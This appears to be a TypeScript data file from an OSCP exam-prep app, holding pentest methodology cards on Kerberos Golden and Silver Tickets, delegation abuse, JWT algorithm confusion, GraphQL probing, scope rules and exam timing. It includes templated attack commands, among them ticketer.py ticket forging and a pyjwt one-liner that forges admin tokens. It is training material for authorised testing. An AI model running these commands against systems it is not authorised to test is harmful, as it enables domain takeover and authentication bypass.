        "Silver Ticket — forged from one target service's own hash. Grants access to just that service on that host. Quieter, narrower, and never touches the DC — no round-trip for the DC to log.",
      ],
      commandBlocks: [
        { label: "Golden Ticket", lines: ["ticketer.py -nthash {{KRBTGT_HASH}} -domain-sid {{DOMAIN_SID}} -domain {{DOMAIN}} {{TARGET_USER}}"] },
        { label: "Silver Ticket", lines: ["ticketer.py -nthash {{SERVICE_HASH}} -domain-sid {{DOMAIN_SID}} -domain {{DOMAIN}} -spn {{SERVICE_SPN}} {{TARGET_USER}}"] },
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "If you only need one service on one box and don't want DC round-trips showing up in the logs, that's a Silver Ticket case, not Golden — Golden is the right call specifically when you need durable access across the whole domain." },
      ],
    },
    {
      id: "ad-deep-4",
      number: "10.4",
      title: "Delegation Abuse",
      tags: [{ label: "DELEGATION", color: "yellow" }],
      steps: [
        "Unconstrained delegation — the host is trusted for any service, for anyone; grab a cached TGT from anyone who connects to it",
        "Constrained delegation — trusted for specific services only, abused via S4U2Self/S4U2Proxy to impersonate a user toward one of those services",
        "Resource-based constrained delegation (RBCD) — the target object itself lists who's allowed to delegate to it; abusable if you can write msDS-AllowedToActOnBehalfOfOtherIdentity on that object",
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "A computer account flagged for unconstrained delegation is worth targeting on sight — any Domain Admin (or high-value account) that authenticates to it hands you a usable TGT." },
      ],
    },
  ],
};

const cryptoApi: MethodologyPhase = {
  id: "crypto-api",
  navLabel: "11 · CRYPTO & API",
  title: "Crypto & Modern API",
  group: "advanced",
  cards: [
    {
      id: "crypto-api-1",
      number: "11.1",
      title: "JWT Algorithm Confusion",
      tags: [{ label: "JWT", color: "blue" }],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "An RS256 token, a public key you can actually reach (downloadable, in a JWKS endpoint, or leaked in a repo), and a verifier that might accept more than one algorithm — that combination is the whole bug." },
      ],
      steps: [
        "Decode the header and payload — confirm the algorithm and which claims gate access",
        "Check whether the RS256 public key is reachable anywhere",
        "If the verifier accepts HS256 too, sign a forged token using that public key as the raw HMAC secret",
      ],
      commandBlocks: [
        { label: "Inspect a token", lines: ["python3 jwt_tool.py {{TOKEN}}"] },
        {
          label: "Forge one with pyjwt",
          lines: [
            "# payload dict, e.g. {'sub': 'user', 'role': 'admin'}",
            "python3 -c \"import jwt; key=open('pubkey.pem').read(); print(jwt.encode(payload_dict, key, algorithm='HS256'))\"",
          ],
        },
      ],
    },
    {
      id: "crypto-api-2",
      number: "11.2",
      title: "Know Your Crypto Smells",
      tags: [{ label: "CRYPTO", color: "blue" }],
      steps: [
        "ECB mode — repeating ciphertext blocks for repeating plaintext is visible and diagnostic on sight",
        "Predictable or reused IVs/nonces — catastrophic for CBC, CTR, and GCM alike, in different ways",
        "Hardcoded secrets in reachable config or source — always worth a grep the moment you have any file access at all",
      ],
    },
    {
      id: "crypto-api-3",
      number: "11.3",
      title: "GraphQL Methodology",
      tags: [{ label: "API", color: "green" }],
      steps: [
        "Introspection first — the schema will describe fields and operations the client app never actually calls",
        "Test id-taking queries with an id that isn't yours — this is BOLA applied to GraphQL specifically",
        "Broken function-level auth looks like: a valid credential of any kind being treated as sufficient, instead of checking which credential it is and what it's actually allowed to do",
      ],
      commandBlocks: [
        { label: "Introspection query", lines: ['curl -X POST http://{{HOST}}/graphql -d \'{"query":"{__schema{types{name fields{name}}}}"}\''] },
      ],
      notes: [
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "curl (with jq to make the JSON readable) is the zero-dependency baseline that always works, everywhere — know it well enough to never be stuck without it. Specialized tools like jwt_tool.py or InQL add real convenience and automated analysis on top, but they're accelerants, not requirements.",
        },
      ],
    },
  ],
};

const scopeTriage: MethodologyPhase = {
  id: "scope-triage",
  navLabel: "12 · SCOPE & TRIAGE",
  title: "Scope, Triage & Professionalism",
  group: "advanced",
  cards: [
    {
      id: "scope-triage-1",
      number: "12.1",
      title: "Rules of Engagement",
      tags: [{ label: "CRITICAL", color: "red" }],
      notes: [
        {
          tone: "danger",
          title: "This is a real boundary, not a game rule",
          body: "Touching a host that's explicitly out of scope — even \"just recon,\" even a single nmap ping — is a real, serious problem on an actual engagement: it's a legal and contractual boundary, not a technical suggestion. Read the rules of engagement before you touch anything, and re-check them if a target's IP looks even slightly off from what was authorized.",
        },
      ],
    },
    {
      id: "scope-triage-2",
      number: "12.2",
      title: "Scanner Report Triage",
      tags: [{ label: "TRIAGE", color: "blue" }],
      steps: [
        "Version-banner double-check — is the flagged version actually still running, or does a patched banner disprove it?",
        "Auth requirement check — does the finding actually apply without credentials it assumed you didn't have?",
        "Encoding/context check — a \"reflected XSS\" that's actually HTML-encoded on output is a false positive, not a finding",
        "Confirm exploitability yourself before writing anything up as real — a scanner's confidence score is not proof",
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "A professional pentest report documents the findings you ruled out, not just the ones you confirmed — that's what separates triage from just forwarding a scanner's raw output." },
      ],
    },
    {
      id: "scope-triage-3",
      number: "12.3",
      title: "Report Writing, Briefly",
      tags: [{ label: "WRITING", color: "green" }],
      steps: [
        "This game can grade a working exploit chain — it can't grade prose",
        "Everything in phase 08 still applies for real engagements: document as you go, screenshot obsessively, write for a reader who wasn't there",
        "A finding nobody can reproduce from your report might as well not exist",
      ],
    },
  ],
};

const ADVANCED_PHASES: MethodologyPhase[] = [binexp, adDeep, cryptoApi, scopeTriage];

export const methodology: MethodologyData = {
  phases: [...CORE_PHASES, ...ADVANCED_PHASES],
  examDay: {
    caveat:
      "Point values reflect OffSec's 2023 PEN-200/OSCP exam format (one AD set + three standalone machines). OffSec has changed the exam structure before — verify current numbers before relying on this for real exam-day planning.",
    durationHours: 24,
    pointsToPass: 70,
    pointsTotal: 100,
    reportWindowHours: 24,
    pointRows: [
      { id: "ad", name: "AD Chain (×3)", maxPoints: 40, partial: { label: "20 (partial)", points: 20 }, full: { label: "40 (full)", points: 40 } },
      { id: "st1", name: "Standalone #1", maxPoints: 20, partial: { label: "10 (user)", points: 10 }, full: { label: "20 (root)", points: 20 } },
      { id: "st2", name: "Standalone #2", maxPoints: 20, partial: { label: "10 (user)", points: 10 }, full: { label: "20 (root)", points: 20 } },
      { id: "st3", name: "Standalone #3", maxPoints: 20, partial: { label: "10 (user)", points: 10 }, full: { label: "20 (root)", points: 20 } },
    ],
    mindset: [
      {
        heading: "Time Allocation",
        items: [
          "Hours 1-2: fire all scans, start on AD",
          "Hours 2-5: attack the AD chain, full focus",
          "Hours 5-6: if AD is done, move to standalones — if not, assess whether you're actually making progress",
          "Hours 6-18: standalones, cycling back to AD as ideas come",
          "Hours 18-22: mop up anything partial",
          "Hours 22-24: stop hacking, write notes, prep the report",
        ],
      },
      {
        heading: "Stuck Protocol",
        items: [
          "Set a 45-minute timer per attack vector",
          "Timer expires → document what you tried → move on",
          "After exhausting all vectors: a 10-minute break, eat something",
          "Fresh eyes after the break — re-read your own notes",
          "Search the exact version plus \"exploit\" or \"CVE\"",
          "Check whether you missed a port or a service entirely",
          "Never spend 3+ hours on one machine",
        ],
      },
      {
        heading: "Before You Start",
        items: [
          "Sleep. Seriously. Non-negotiable.",
          "Set up your notes template before the clock starts",
          "Have wordlists and tools ready and tested",
          "Create a folder structure: /exam/$IP/scans, /loot, /exploits",
          "VPN connected and tested",
          "Eat before you start",
        ],
      },
      {
        heading: "Non-Negotiables",
        items: [
          "Screenshot proof.txt the second you get it",
          "Your IP must be visible in every proof screenshot",
          "Document every command you run",
          "70 points is the goal — not 100",
          "The AD chain is worth the most — it's your first objective, always",
          "Partial credit (a user shell) beats nothing at all",
        ],
      },
    ],
  },
};
